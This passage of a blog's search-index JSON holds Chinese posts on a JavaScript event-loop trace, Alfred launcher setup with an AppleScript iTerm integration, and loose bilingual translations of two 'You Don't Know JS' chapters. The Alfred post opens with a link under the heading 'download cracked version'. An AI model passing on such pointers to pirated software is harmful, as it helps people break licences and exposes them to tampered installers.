class=\"line\"></span><br><span class=\"line\">#过程六:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask:</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end、promise1、promise2</span><br><span class=\"line\"></span><br><span class=\"line\">#过程七:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask:</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task:</span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end、promise1、promise2、setTimeout</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js"]},{"title":"alfred工具","url":"http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"下载破解版\"><a href=\"#下载破解版\" class=\"headerlink\" title=\"下载破解版\"></a>下载破解版</h2><p><a href=\"https://www.jianshu.com/p/5b3f98b1f7b6\" target=\"_blank\" rel=\"noopener\">文章地址</a></p>\n<h2 id=\"功能使用\"><a href=\"#功能使用\" class=\"headerlink\" title=\"功能使用\"></a>功能使用</h2><p><a href=\"https://juejin.im/post/5b0e99436fb9a009e405dbb6\" target=\"_blank\" rel=\"noopener\">掘金地址</a></p>\n<h2 id=\"web搜索设置\"><a href=\"#web搜索设置\" class=\"headerlink\" title=\"web搜索设置\"></a>web搜索设置</h2><ul>\n<li>百度:<a href=\"https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}\" target=\"_blank\" rel=\"noopener\">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}</a></li>\n<li>stackoverflow:<a href=\"http://www.stackoverflow.com/search?q={query}\" target=\"_blank\" rel=\"noopener\">http://www.stackoverflow.com/search?q={query}</a></li>\n<li>githubUser:<a href=\"https://github.com/{query}\" target=\"_blank\" rel=\"noopener\">https://github.com/{query}</a></li>\n<li>githubSearch:<a href=\"https://github.com/search?utf8=%E2%9C%93&amp;q={query}\" target=\"_blank\" rel=\"noopener\">https://github.com/search?utf8=%E2%9C%93&amp;q={query}</a></li>\n<li>MDN:<a href=\"https://developer.mozilla.org/zh-CN/search?q={query}\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/search?q={query}</a></li>\n<li>juejin: <a href=\"https://juejin.im/search?query={query}\" target=\"_blank\" rel=\"noopener\">https://juejin.im/search?query={query}</a></li>\n</ul>\n<h2 id=\"alfred集成iterm2\"><a href=\"#alfred集成iterm2\" class=\"headerlink\" title=\"alfred集成iterm2\"></a>alfred集成iterm2</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">on alfred_script(q)</span><br><span class=\"line\">\tif application &quot;iTerm&quot; is running or application &quot;iTerm&quot; is running then</span><br><span class=\"line\">\t\trun script &quot;</span><br><span class=\"line\">\t\t\ton run &#123;q&#125;</span><br><span class=\"line\">\t\t\t\ttell application \\&quot;:Applications:iTerm.app\\&quot;</span><br><span class=\"line\">\t\t\t\t\tactivate</span><br><span class=\"line\">\t\t\t\t\ttry</span><br><span class=\"line\">\t\t\t\t\t\tselect first window</span><br><span class=\"line\">\t\t\t\t\t\tset onlywindow to false</span><br><span class=\"line\">\t\t\t\t\ton error</span><br><span class=\"line\">\t\t\t\t\t\tcreate window with default profile</span><br><span class=\"line\">\t\t\t\t\t\tselect first window</span><br><span class=\"line\">\t\t\t\t\t\tset onlywindow to true</span><br><span class=\"line\">\t\t\t\t\tend try</span><br><span class=\"line\">\t\t\t\t\ttell current session of the first window</span><br><span class=\"line\">\t\t\t\t\t\tif onlywindow is false then</span><br><span class=\"line\">\t\t\t\t\t\t\ttell split vertically with default profile</span><br><span class=\"line\">\t\t\t\t\t\t\t\twrite text q</span><br><span class=\"line\">\t\t\t\t\t\t\tend tell</span><br><span class=\"line\">\t\t\t\t\t\tend if</span><br><span class=\"line\">\t\t\t\t\tend tell</span><br><span class=\"line\">\t\t\t\tend tell</span><br><span class=\"line\">\t\t\tend run</span><br><span class=\"line\">\t\t&quot; with parameters &#123;q&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\trun script &quot;</span><br><span class=\"line\">\t\t\ton run &#123;q&#125;</span><br><span class=\"line\">\t\t\t\ttell application \\&quot;:Applications:iTerm.app\\&quot;</span><br><span class=\"line\">\t\t\t\t\tactivate</span><br><span class=\"line\">\t\t\t\t\ttry</span><br><span class=\"line\">\t\t\t\t\t\tselect first window</span><br><span class=\"line\">\t\t\t\t\ton error</span><br><span class=\"line\">\t\t\t\t\t\tcreate window with default profile</span><br><span class=\"line\">\t\t\t\t\t\tselect first window</span><br><span class=\"line\">\t\t\t\t\tend try</span><br><span class=\"line\">\t\t\t\t\ttell the first window</span><br><span class=\"line\">\t\t\t\t\t\ttell current session to write text q</span><br><span class=\"line\">\t\t\t\t\tend tell</span><br><span class=\"line\">\t\t\t\tend tell</span><br><span class=\"line\">\t\t\tend run</span><br><span class=\"line\">\t\t&quot; with parameters &#123;q&#125;</span><br><span class=\"line\">\tend if</span><br><span class=\"line\">end alfred_script</span><br></pre></td></tr></table></figure>\n<h2 id=\"workflows\"><a href=\"#workflows\" class=\"headerlink\" title=\"workflows\"></a>workflows</h2><blockquote>\n<p>有道</p>\n</blockquote>\n<p><a href=\"https://github.com/kaiye/workflows-youdao/\" target=\"_blank\" rel=\"noopener\">https://github.com/kaiye/workflows-youdao/</a></p>\n<h2 id=\"修复alfred工作流错误\"><a href=\"#修复alfred工作流错误\" class=\"headerlink\" title=\"修复alfred工作流错误\"></a>修复alfred工作流错误</h2><ul>\n<li><p><a href=\"https://github.com/deanishe/alfred-fixum/releases/tag/v0.8\" target=\"_blank\" rel=\"noopener\">fixum修复工具下载</a></p>\n</li>\n<li><p>导入<code>Fixum-0.8.alfredworkflow</code>修复工具</p>\n</li>\n<li>打开alfred快捷搜索，输入<code>fixum</code>,选择<code>fix workflows</code></li>\n</ul>\n","categories":["tool"],"tags":["alfred"]},{"title":"译文:you don't know js 之 Into Programming","url":"http://zhoushaw.github.io/2019/02/28/learning/book-notes/you's not know javascript/Into Programming/","content":"<h2 id=\"Chapter-1-Into-Programming\"><a href=\"#Chapter-1-Into-Programming\" class=\"headerlink\" title=\"Chapter 1: Into Programming\"></a>Chapter 1: Into Programming</h2><p>Welcome to the You Don’t Know JS (YDKJS) series.</p>\n<p>欢迎来到你不懂js系列</p>\n<div><a id=\"more\"></a></div>\n\n<p>Up &amp; Going is an introduction to several basic concepts of programming – of course we lean toward JavaScript (often abbreviated JS) specifically – and how to approach and understand the rest of the titles in this series. Especially if you’re just getting into programming and/or JavaScript, this book will briefly explore what you need to get up and going.</p>\n<p>Up &amp; Going是为了介绍程序基本概念的，当然我们特别倾向于javascript(通常简称为JS)，如何看待与裂解本系列其他书目。如果你准备好进入程序或者javascript了。这本书将简单浏览你需要什么来入门与进阶。</p>\n<p>This book starts off explaining the basic principles of programming at a very high level. It’s mostly intended if you are starting YDKJS with little to no prior programming experience, and are looking to these books to help get you started along a path to understanding programming through the lens of JavaScript.</p>\n<p>本书开始解释程序的基础原则在很高的级别。如果你开始阅读YDKJS带有较少或没有程序经验并且寻找这些书通过javascrpt去帮助你开始理解程序，那么本书的主要目的就是帮助你了解如何开始YDKJS。</p>\n<p>Chapter 1 should be approached as a quick overview of the things you’ll want to learn more about and practice to get into programming. There are also many other fantastic programming introduction resources that can help you dig into these topics further, and I encourage you to learn from them in addition to this chapter.</p>\n<p>第一章应该适合快速的预览你想要学习和训练进入程序。这里有很多能帮助你深入这些话题的有用的程序资源，我鼓励你在这一章之外向他们学习。</p>\n<p>Once you feel comfortable with general programming basics, Chapter 2 will help guide you to a familiarity with JavaScript’s flavor of programming. Chapter 2 introduces what JavaScript is about, but again, it’s not a comprehensive guide – that’s what the rest of the YDKJS books are for!</p>\n<p>一旦你对普通的程序基础适应了，第二章将会帮助你熟悉javascript的程序。第二章介绍了javascript是关于什么的，再者，它不只是全面的指南 – 这是其余YDKJS系列书的作用。</p>\n<p>If you’re already fairly comfortable with JavaScript, first check out Chapter 3 as a brief glimpse of what to expect from YDKJS, then jump right in!</p>\n<p>如果你已经很熟练javascript，那么首先快速的预览一下第三章，然后快速的进入学习吧。</p>\n<p>##Code</p>\n<p>Let’s start from the beginning.</p>\n<p>让我们从这开始吧。</p>\n<p>A program, often referred to as source code or just code, is a set of special instructions to tell the computer what tasks to perform. Usually code is saved in a text file, although with JavaScript you can also type code directly into a developer console in a browser, which we’ll cover shortly.</p>\n<p>一个程序，经常被交付源码或者就是编码，去设置了一个特殊的介绍告诉计算机哪些任务被执行。通常代码被使用文本文件存储，通过javascript，你也可以输入代码直接在浏览器的开发者区输入代码，稍后我们会讲到这一点。</p>\n<p>The rules for valid format and combinations of instructions is called a computer language, sometimes referred to as its syntax, much the same as English tells you how to spell words and how to create valid sentences using words and punctuation.</p>\n<p>有效的格式和混合的指令被称之为计算机语言，有时被作为它的预发，更像是英语告诉你如何使用单词和标点拼写单词并且如何创造有效的句子。</p>\n<p>##Statements</p>\n<p>In a computer language, a group of words, numbers, and operators that performs a specific task is a statement. In JavaScript, a statement might look as follows:</p>\n<p>在计算机中，一组单词、数字和运算符执行一个特殊的任务是一个句子。在javascript中一个句子可能看来像下面这样:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = b * 2;</span><br></pre></td></tr></table></figure>\n<p>The characters a and b are called variables (see “Variables”), which are like simple boxes you can store any of your stuff in. In programs, variables hold values (like the number 42) to be used by the program. Think of them as symbolic placeholders for the values themselves.</p>\n<p>字符a和b被称之为变量，就像是一个你能存储任何东西在里面的盒子。在程序中，变量存放值(像数字42)来给程序用。将他们看做值本身的符号占位符。</p>\n<p>By contrast, the 2 is just a value itself, called a literal value, because it stands alone without being stored in a variable.</p>\n<p>相比之下，2就是这个值的本身，称之为字面量。因为它独立存在没有存在任何变量中。</p>\n<p>The = and * characters are operators (see “Operators”) – they perform actions with the values and variables such as assignment and mathematic multiplication.</p>\n<p>=和*字符是操作符 – 他们使用值和变量执行运算相比如赋值和乘法运算。</p>\n<p>Most statements in JavaScript conclude with a semicolon (;) at the end.</p>\n<p>大多javascript声明的结尾带有;号。</p>\n<p>The statement a = b <em> 2; tells the computer, roughly, to get the current value stored in the variable b, multiply that value by 2, then store the result back into another variable we call a.<br>a = b </em>2声明告诉计算机，概略的是，获取当前值存储在变量b中，乘2，然后存储到我们称之为a的变量中。</p>\n<p>Programs are just collections of many such statements, which together describe all the steps that it takes to perform your program’s purpose.</p>\n<p>程序就是有相当多的声明，这些声明一同描述了它执行你程序目的的所有步骤。</p>\n<h2 id=\"Expressions\"><a href=\"#Expressions\" class=\"headerlink\" title=\"Expressions\"></a>Expressions</h2><p>Statements are made up of one or more expressions. An expression is any reference to a variable or value, or a set of variable(s) and value(s) combined with operators.</p>\n<p>声明是由一个或多个表达式构成的。</p>\n<p>For example:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = b * 2;</span><br></pre></td></tr></table></figure>\n<p>This statement has four expressions in it:</p>\n<p>这个声明有四个表达式:</p>\n<p>2 is a literal value expression</p>\n<p>2是一个字面量表达式</p>\n<p>b is a variable expression, which means to retrieve its current value</p>\n<p>b是一个变量表达式，它检索当前的值</p>\n<p>b * 2 is an arithmetic expression, which means to do the multiplication</p>\n<p>b * 2 是一个算术表达式，意味着乘法</p>\n<p>a = b <em> 2 is an assignment expression, which means to assign the result of the b </em> 2 expression to the variable a (more on assignments later)</p>\n<p>a = b <em> 2是一个任务表达式，以为着b </em> 2表达式的结果存储到变量a上</p>\n<p>A general expression that stands alone is also called an expression statement, such as the following:</p>\n<p>一般表达式独立存在的也称之为表达式语句，例如下面的</p>\n<p>b * 2;<br>This flavor of expression statement is not very common or useful, as generally it wouldn’t have any effect on the running of the program – it would retrieve the value of b and multiply it by 2, but then wouldn’t do anything with that result.<br>这种风格的表达式语句不是很常见和有效，运行这个程序通常不会产生任何影响 – 它将会检索b的值然后乘2，但是不会对结果做任何处理</p>\n<p>A more common expression statement is a call expression statement (see “Functions”), as the entire statement is the function call expression itself:</p>\n<p>一个最常见的声明语句是调用表达式语句(参见函数)，整个表达式语句被称之为函数它自己。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert( a );</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Executing-a-Program\"><a href=\"#Executing-a-Program\" class=\"headerlink\" title=\"Executing a Program\"></a>Executing a Program</h2><p>How do those collections of programming statements tell the computer what to do? The program needs to be executed, also referred to as running the program.</p>\n<p>如何通过这些收集的程序语句来告诉计算机做什么？程序需要被执行，也被称为运行项目。</p>\n<p>Statements like a = b * 2 are helpful for developers when reading and writing, but are not actually in a form the computer can directly understand. So a special utility on the computer (either an interpreter or a compiler) is used to translate the code you write into commands a computer can understand.</p>\n<p>在阅读和编写时像<code>a = b *2</code>这样的语句对于开发者来说是有帮助的，但是事实上计算机不能直接理解。所以在计算机中(也可以是 一个翻译者 或 编译者)一个特殊的工具被用来翻译你写的代码转变成计算机能够理解的命令。</p>\n<p>For some computer languages, this translation of commands is typically done from top to bottom, line by line, every time the program is run, which is usually called interpreting the code.</p>\n<p>对于一些计算机语言，翻译命令通常是从上至下翻译，一行一行向下，每次运行程序，通常被称之为解析代码。</p>\n<p>For other languages, the translation is done ahead of time, called compiling the code, so when the program runs later, what’s running is actually the already compiled computer instructions ready to go.</p>\n<p>对于一些其他语言，提前翻译完成，称之为编译代码，所以当程序稍后运行时，他运行的实际上是已经编译完成能够运行的计算机结构。</p>\n<p>It’s typically asserted that JavaScript is interpreted, because your JavaScript source code is processed each time it’s run. But that’s not entirely accurate. The JavaScript engine actually compiles the program on the fly and then immediately runs the compiled code.</p>\n<p>一般宣称JavaScript为解释性语言，因为每次运行JavaScript源码是都会处理它。但是不是完全精准，JavaScript引擎动态编译代码，并且立即运行编译的代码。</p>\n<p>Note: For more information on JavaScript compiling, see the first two chapters of the Scope &amp; Closures title of this series.</p>\n<p>笔记:更多关于JavaScript的编译信息，看这一系列的作用域 &amp; 闭包的标题的前两章。</p>\n<p>##Try It Yourself</p>\n<p>This chapter is going to introduce each programming concept with simple snippets of code, all written in JavaScript (obviously!).</p>\n<p>这一章是使用简单的一段代码来讲述每一段程序的概念，所有使用代码JavaScript编写的(显而易见的！)</p>\n<p>It cannot be emphasized enough: while you go through this chapter – and you may need to spend the time to go over it several times – you should practice each of these concepts by typing the code yourself. The easiest way to do that is to open up the developer tools console in your nearest browser (Firefox, Chrome, IE, etc.).</p>\n<p>这一点无论如何强调都不过分: 当你开始阅读这一章 – 并且你可能需要花一些时间去反复阅读它。你应该通过编写代码来锻炼这些概念。最简单的方式是打开最近的浏览器的开发者工具(火狐、谷歌、Ie，其他)</p>\n<p>Tip: Typically, you can launch the developer console with a keyboard shortcut or from a menu item. For more detailed information about launching and using the console in your favorite browser, see “Mastering The Developer Tools Console” (<a href=\"http://blog.teamtreehouse.com/mastering-developer-tools-console)\" target=\"_blank\" rel=\"noopener\">http://blog.teamtreehouse.com/mastering-developer-tools-console)</a>. To type multiple lines into the console at once, use <shift> + <enter> to move to the next new line. Once you hit <enter> by itself, the console will run everything you’ve just typed.</enter></enter></shift></p>\n<p>提示:通常，你可以通过键盘的快捷键或者菜单选项打开开发者输入台，更多关于在你最喜欢的浏览器中打开和使用控制台，请看“掌握开发者控制台” (<a href=\"http://blog.teamtreehouse.com/mastering-developer-tools-console)，一次在控制台中输入多行，使用\" target=\"_blank\" rel=\"noopener\">http://blog.teamtreehouse.com/mastering-developer-tools-console)，一次在控制台中输入多行，使用</a><shift> + <enter> 移动光标到下一行，一旦你按下回车，控制台将会运行你输入的一切。</enter></shift></p>\n<p>Let’s get familiar with the process of running code in the console. First, I suggest opening up an empty tab in your browser. I prefer to do this by typing about:blank into the address bar. Then, make sure your developer console is open, as we just mentioned.</p>\n<p>让我们熟悉一下在控台内代码运行的过程。首先，我建议你在你的浏览器上打开一个新的标签，我更喜欢在地址栏输入<code>about:blank</code>，然后，确保你的开发者控制台是打开的，就像我们刚才提及的那样。</p>\n<p>Now, type this code and see how it runs:</p>\n<p>现在，输入这段代码然后看它执行:</p>\n<p>a = 21;</p>\n<p>b = a * 2;</p>\n<p>console.log( b );<br>Typing the preceding code into the console in Chrome should produce something like the following:</p>\n<p>输入过程之前的代码到谷歌控制台应该产生一些向下面的事情:</p>\n<p>Go on, try it. The best way to learn programming is to start coding!</p>\n<p>继续，试试看。学习程序最好的方法是开始编码。</p>\n<h2 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h2><p>In the previous code snippet, we used console.log(..). Briefly, let’s look at what that line of code is all about.</p>\n<p>在先前的代码片段，我们使用了console.log(..).短暂的，让我们寻找一下这一行代码是关于什么的。</p>\n<p>You may have guessed, but that’s exactly how we print text (aka output to the user) in the developer console. There are two characteristics of that statement that we should explain.</p>\n<p>你可能已经猜到了，但是那正是我们如何在开发者控制台中打印文本(输入用户名)，我们应该解释这个语句中的那两个字符。</p>\n<p>First, the log( b ) part is referred to as a function call (see “Functions”). What’s happening is we’re handing the b variable to that function, which asks it to take the value of b and print it to the console.</p>\n<p>首先，这个log(b)部分被称为函数(看 “函数”)。我们将变量b交给这个函数发生了什么，这个函数要求它取b的值并且打印在控制台上。</p>\n<p>Second, the console. part is an object reference where the log(..) function is located. We cover objects and their properties in more detail in Chapter 2.</p>\n<p>第二，<code>console.</code>部分是位于<code>log(..)</code>函数部分对象的引用，我们在第二章介绍了对象和他们属性更多的细节。</p>\n<p>Another way of creating output that you can see is to run an alert(..) statement. For example:</p>\n<p>你能看到其他方式创建输出语句是使用<code>alert()</code>语句。例如:</p>\n<p>alert( b );<br>If you run that, you’ll notice that instead of printing the output to the console, it shows a popup “OK” box with the contents of the b variable. However, using console.log(..) is generally going to make learning about coding and running your programs in the console easier than using alert(..), because you can output many values at once without interrupting the browser interface.</p>\n<p>如果你运行这段代码，你将会注意到它代替了输出在控制台上,它显示一个弹出的“ok”框带有变量b的内容。然而，通常使用<code>console.log(..)</code>学习关于编程和运行程序比使用<code>alert(..)</code>更容易，因为你可以一次性输出很多值并且不会中断页面。</p>\n<p>For this book, we’ll use console.log(..) for output.</p>\n<p>对于本书，我们使用<code>console.log(..)</code>来输出</p>\n<p>##Input</p>\n<p>While we’re discussing output, you may also wonder about input (i.e., receiving information from the user).</p>\n<p>当我们在讨论输出时，你可能也想要知道输入(接收用户的信息)</p>\n<p>The most common way that happens is for the HTML page to show form elements (like text boxes) to a user that they can type into, and then using JS to read those values into your program’s variables.</p>\n<p>发生这种最常见的方式是HTML页面展示表单元素(想文本输入框)给用户输入，然后使用JS去读取这些变量到你程序的变量中。</p>\n<p>But there’s an easier way to get input for simple learning and demonstration purposes such as what you’ll be doing throughout this book. Use the prompt(..) function:</p>\n<p>但是最简单方式的获取用户输入对于简单的学习和演示目的，比如你将要通过本书来做的。使用<code>prompt(..)</code>函数:</p>\n<p>age = prompt( “Please tell me your age:” );</p>\n<p>console.log( age );<br>As you may have guessed, the message you pass to prompt(..) – in this case, “Please tell me your age:” – is printed into the popup.</p>\n<p>你可能已经猜到了，你输入到<code>prompt(..)</code>的信息 –在这个案例里。“请告诉我你的名字:” – 打印在这个弹窗上。</p>\n<p>This should look similar to the following:</p>\n<p>看起来跟下列的很相似:</p>\n<p>Once you submit the input text by clicking “OK,” you’ll observe that the value you typed is stored in the age variable, which we then output with console.log(..):</p>\n<p>一旦你通过点击“ok”来提交输入文本，你将会观察到你输入的将会存储到age变量中，然后我们通过<code>console.log(..)</code>输出变量</p>\n<p>To keep things simple while we’re learning basic programming concepts, the examples in this book will not require input. But now that you’ve seen how to use prompt(..), if you want to challenge yourself you can try to use input in your explorations of the examples.</p>\n<p>当我们学习基础程序概念时保持简单，在这本书的案例中将不需要输入。但是现在你已经知道如何使用<code>prompt(..)</code>，如果你想要挑战你自己你可以尝试使用input来探索这个案例。</p>\n<h2 id=\"Operators\"><a href=\"#Operators\" class=\"headerlink\" title=\"Operators\"></a>Operators</h2><p>Operators are how we perform actions on variables and values. We’ve already seen two JavaScript operators, the = and the *.</p>\n<p>操作符是我们如何操作变量和值，我们已经看到两个JavaScript操作符，=号和*号。</p>\n<p>The * operator performs mathematic multiplication. Simple enough, right?</p>\n<p>*号操作符执行数学乘法运算，很简单对吗？</p>\n<p>The = equals operator is used for assignment – we first calculate the value on the right-hand side (source value) of the = and then put it into the variable that we specify on the left-hand side (target variable).</p>\n<p>=号操作符通常用来复制– 我们首先计算等号右边的值然后将值=号左边的变量中(目标变量).</p>\n<p>Warning: This may seem like a strange reverse order to specify assignment. Instead of a = 42, some might prefer to flip the order so the source value is on the left and the target variable is on the right, like 42 -&gt; a (this is not valid JavaScript!). Unfortunately, the a = 42 ordered form, and similar variations, is quite prevalent in modern programming languages. If it feels unnatural, just spend some time rehearsing that ordering in your mind to get accustomed to it.</p>\n<p>Consider:</p>\n<p>a = 2;<br>b = a + 1;<br>Here, we assign the 2 value to the a variable. Then, we get the value of the a variable (still 2), add 1 to it resulting in the value 3, then store that value in the b variable.</p>\n<p>While not technically an operator, you’ll need the keyword var in every program, as it’s the primary way you declare (aka create) variables (see “Variables”).</p>\n<p>You should always declare the variable by name before you use it. But you only need to declare a variable once for each scope (see “Scope”); it can be used as many times after that as needed. For example:</p>\n<p>var a = 20;</p>\n<p>a = a + 1;<br>a = a * 2;</p>\n<p>console.log( a );    // 42<br>Here are some of the most common operators in JavaScript:</p>\n<p>Assignment: = as in a = 2.</p>\n<p>Math: + (addition), - (subtraction), <em> (multiplication), and / (division), as in a </em> 3.</p>\n<p>Compound Assignment: +=, -=, *=, and /= are compound operators that combine a math operation with assignment, as in a += 2 (same as a = a + 2).</p>\n<p>Increment/Decrement: ++ (increment), – (decrement), as in a++ (similar to a = a + 1).</p>\n<p>Object Property Access: . as in console.log().</p>\n<p>Objects are values that hold other values at specific named locations called properties. obj.a means an object value called obj with a property of the name a. Properties can alternatively be accessed as obj[“a”]. See Chapter 2.</p>\n<p>Equality: == (loose-equals), === (strict-equals), != (loose not-equals), !== (strict not-equals), as in a == b.</p>\n<p>See “Values &amp; Types” and Chapter 2.</p>\n<p>Comparison: &lt; (less than), &gt; (greater than), &lt;= (less than or loose-equals), &gt;= (greater than or loose-equals), as in a &lt;= b.</p>\n<p>See “Values &amp; Types” and Chapter 2.</p>\n<p>Logical: &amp;&amp; (and), || (or), as in a || b that selects either a or b.</p>\n<p>These operators are used to express compound conditionals (see “Conditionals”), like if either a or b is true.</p>\n<p>Note: For much more detail, and coverage of operators not mentioned here, see the Mozilla Developer Network (MDN)’s “Expressions and Operators” (<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)</a>.</p>\n<p>Values &amp; Types<br>If you ask an employee at a phone store how much a certain phone costs, and they say “ninety-nine, ninety-nine” (i.e., $99.99), they’re giving you an actual numeric dollar figure that represents what you’ll need to pay (plus taxes) to buy it. If you want to buy two of those phones, you can easily do the mental math to double that value to get $199.98 for your base cost.</p>\n<p>If that same employee picks up another similar phone but says it’s “free” (perhaps with air quotes), they’re not giving you a number, but instead another kind of representation of your expected cost ($0.00) – the word “free.”</p>\n<p>When you later ask if the phone includes a charger, that answer could only have been either “yes” or “no.”</p>\n<p>In very similar ways, when you express values in a program, you choose different representations for those values based on what you plan to do with them.</p>\n<p>These different representations for values are called types in programming terminology. JavaScript has built-in types for each of these so called primitive values:</p>\n<p>When you need to do math, you want a number.<br>When you need to print a value on the screen, you need a string (one or more characters, words, sentences).<br>When you need to make a decision in your program, you need a boolean (true or false).<br>Values that are included directly in the source code are called literals. string literals are surrounded by double quotes “…” or single quotes (‘…’) – the only difference is stylistic preference. number and boolean literals are just presented as is (i.e., 42, true, etc.).</p>\n<p>Consider:</p>\n<p>“I am a string”;<br>‘I am also a string’;</p>\n<p>42;</p>\n<p>true;<br>false;<br>Beyond string/number/boolean value types, it’s common for programming languages to provide arrays, objects, functions, and more. We’ll cover much more about values and types throughout this chapter and the next.</p>\n<p>Converting Between Types<br>If you have a number but need to print it on the screen, you need to convert the value to a string, and in JavaScript this conversion is called “coercion.” Similarly, if someone enters a series of numeric characters into a form on an ecommerce page, that’s a string, but if you need to then use that value to do math operations, you need to coerce it to a number.</p>\n<p>JavaScript provides several different facilities for forcibly coercing between types. For example:</p>\n<p>var a = “42”;<br>var b = Number( a );</p>\n<p>console.log( a );    // “42”<br>console.log( b );    // 42<br>Using Number(..) (a built-in function) as shown is an explicit coercion from any other type to the number type. That should be pretty straightforward.</p>\n<p>But a controversial topic is what happens when you try to compare two values that are not already of the same type, which would require implicit coercion.</p>\n<p>When comparing the string “99.99” to the number 99.99, most people would agree they are equivalent. But they’re not exactly the same, are they? It’s the same value in two different representations, two different types. You could say they’re “loosely equal,” couldn’t you?</p>\n<p>To help you out in these common situations, JavaScript will sometimes kick in and implicitly coerce values to the matching types.</p>\n<p>So if you use the == loose equals operator to make the comparison “99.99” == 99.99, JavaScript will convert the left-hand side “99.99” to its number equivalent 99.99. The comparison then becomes 99.99 == 99.99, which is of course true.</p>\n<p>While designed to help you, implicit coercion can create confusion if you haven’t taken the time to learn the rules that govern its behavior. Most JS developers never have, so the common feeling is that implicit coercion is confusing and harms programs with unexpected bugs, and should thus be avoided. It’s even sometimes called a flaw in the design of the language.</p>\n<p>However, implicit coercion is a mechanism that can be learned, and moreover should be learned by anyone wishing to take JavaScript programming seriously. Not only is it not confusing once you learn the rules, it can actually make your programs better! The effort is well worth it.</p>\n<p>Note: For more information on coercion, see Chapter 2 of this title and Chapter 4 of the Types &amp; Grammar title of this series.</p>\n","categories":["js"],"tags":["book"]},{"title":"译文:you don't know js 之 Into YDKJS","url":"http://zhoushaw.github.io/2019/02/26/learning/book-notes/you's not know javascript/Into YDKJS/","content":"<h2 id=\"Chapter-3-Into-YDKJS\"><a href=\"#Chapter-3-Into-YDKJS\" class=\"headerlink\" title=\"Chapter 3: Into YDKJS\"></a>Chapter 3: Into YDKJS</h2><p>What is this series all about? Put simply, it’s about taking seriously the task of learning all parts of JavaScript, not just some subset of the language that someone called “the good parts,” and not just whatever minimal amount you need to get your job done at work.</p>\n<p>这一系列书主要用于谈论什么呢？简单来说，这一系列书主要用户讲述如何学好javascript，而不是学习一些人称之为javascript中好的部分，也不仅仅能让你搞定工作的那一小部分内容。</p>\n<div><a id=\"more\"></a></div>\n\n<p>Serious developers in other languages expect to put in the effort to learn most or all of the language(s) they primarily write in, but JS developers seem to stand out from the crowd in the sense of typically not learning very much of the language. This is not a good thing, and it’s not something we should continue to allow to be the norm.</p>\n<p>在其他语言中，认真的开发者总是希望努力学习他们主要使用语言的大部分或全部。但JS开发者通常不太学习这门语言，而显得特别突出。这不是一件好事，我们也不应该将其视为常态。</p>\n<p>The You Don’t Know JS (YDKJS) series stands in stark(完全) contrast(对比) to the typical approaches to learning JS, and is unlike almost any other JS books you will read. It challenges you to go beyond your comfort zone(舒适区) and to ask the deeper “why” questions for every single behavior you encounter. Are you up for that challenge?</p>\n<p>你不知道JS系列书籍与传统的学习JS方式大不相同，它也不像你所阅读的其他系列的JS书籍。它会使你遇到挑战逼迫你走出舒适区，对你遇到的每一个问题深入的问为什么。你准备好迎接挑战了吗？</p>\n<p>I’m going to use this final chapter to briefly(短暂) summarize(总结) what to expect from the rest of the books in the series, and how to most effectively go about building a foundation of JS learning on top of(在…之上) YDKJS.</p>\n<p>我将会用最后一章来做一个简短的总结，这一系列其他章节的内容，如何更有效的通过YDKJS建立学习JS的基础。</p>\n<h2 id=\"作用域-amp-闭包\"><a href=\"#作用域-amp-闭包\" class=\"headerlink\" title=\"作用域 &amp; 闭包\"></a>作用域 &amp; 闭包</h2><p>Perhaps one of the most fundamental things you’ll need to quickly come to terms with is how scoping of variables really works in JavaScript. It’s not enough to have anecdotal fuzzy beliefs about 